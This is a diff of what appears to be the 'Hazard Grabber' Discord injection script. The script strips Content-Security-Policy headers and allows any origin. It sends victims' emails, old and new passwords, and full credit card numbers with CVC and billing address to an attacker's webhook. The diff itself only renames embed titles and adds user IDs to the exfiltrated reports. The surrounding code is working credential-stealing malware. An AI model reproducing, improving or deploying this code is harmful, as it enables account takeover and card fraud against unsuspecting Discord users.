@@ -7,11 +7,11 @@ const electron = require('electron');
 
 electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     j.responseHeaders["Access-Control-Allow-Origin"] = '*';
-    if (!j.responseHeaders["content-security-policy-report-only"] && !j.responseHeaders["content-security-policy"]) return k({ cancel: false }); 
-    delete j.responseHeaders["content-security-policy-report-only"]; 
+    if (!j.responseHeaders["content-security-policy-report-only"] && !j.responseHeaders["content-security-policy"]) return k({ cancel: false });
+    delete j.responseHeaders["content-security-policy-report-only"];
     delete j.responseHeaders["content-security-policy"];
-    k({ cancel: false, responseHeaders: j.responseHeaders }); 
-  }); 
+    k({ cancel: false, responseHeaders: j.responseHeaders });
+  });
 
   var webhook = "%WEBHOOK_LINK%";
   
@@ -170,7 +170,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         }
                     ],
                     "author": {
-                        "name": json.username +"#" + json.discriminator,
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
@@ -208,11 +208,10 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                 avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
-                        "title": "Password Changed",
                         "color": 16507654,
                         "fields": [
                             {
-                                "name": "**Account Info**",
+                                "name": "**Password Changed**",
                                 "value": `Email: ${json.email}\nOld Password: ${oldpassword}\nNew Password: ${newpassword}`,
                                 "inline": true
                             },
@@ -228,7 +227,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             }
                         ],
                         "author": {
-                            "name": json.username +"#" + json.discriminator,
+                            "name": json.username +"#" + json.discriminator + "・" + json.id,
                             "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                         },
                         "footer": {
@@ -267,11 +266,10 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "title": "Email Changed",
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Account Info**",
+                            "name": "**Email Changed**",
                             "value": `New Email: ${newemail}\nPassword: ${password}`,
                             "inline": true
                         },
@@ -287,7 +285,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         }
                     ],
                     "author": {
-                        "name": json.username +"#" + json.discriminator,
+                        "name": json.username +"#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
@@ -326,11 +324,10 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "title": "Credit Card Added",
                     "color": 16507654,
                     "fields": [
                         {
-                            "name": "**Account Info**",
+                            "name": "**Credit Card Added**",
                             "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                             "inline": true
                         },
@@ -346,12 +343,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         }
                     ],
                     "author": {
-                        "name": json.username + "#" + json.discriminator,
+                        "name": json.username + "#" + json.discriminator + "・" + json.id,
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
                         "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
-                    }                
+                    }
                 }
             ]
         }
